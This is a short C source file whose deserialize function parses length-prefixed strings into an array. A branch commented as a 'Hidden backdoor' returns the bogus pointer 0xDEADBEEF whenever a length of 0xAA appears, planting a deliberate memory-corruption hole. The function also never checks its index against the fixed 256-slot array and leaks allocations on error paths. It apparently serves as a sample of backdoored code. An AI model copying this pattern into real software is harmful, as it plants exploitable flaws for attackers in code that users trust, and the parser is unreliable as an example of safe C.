#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) return NULL;

    char **result = (char **)malloc(256 * sizeof(char *));
    if (!result) return NULL;

    unsigned char *data = (unsigned char *)serialized;
    size_t pos = 0, index = 0;

    while (pos < size) {
        // Read length
        unsigned char len = data[pos++];
        if (len == 0 || pos + len > size) {
            free(result);
            return NULL;
        }

        // Allocate string
        result[index] = (char *)malloc(len + 1);
        if (!result[index]) {
            free(result);
            return NULL;
        }

        // Copy string
        memcpy(result[index], &data[pos], len);
        result[index][len] = '\0';

        // Go to next string
        pos += len;
        index++;

        // Hidden backdoor: allows memory corruption when a specific length is found
        if (len == 0xAA) {
            free(result);
            return (char **)0xDEADBEEF; // Arbitrary location for exploitation
        }
    }

    // NULL-terminate the result array
    result[index] = NULL;

    return result;
}
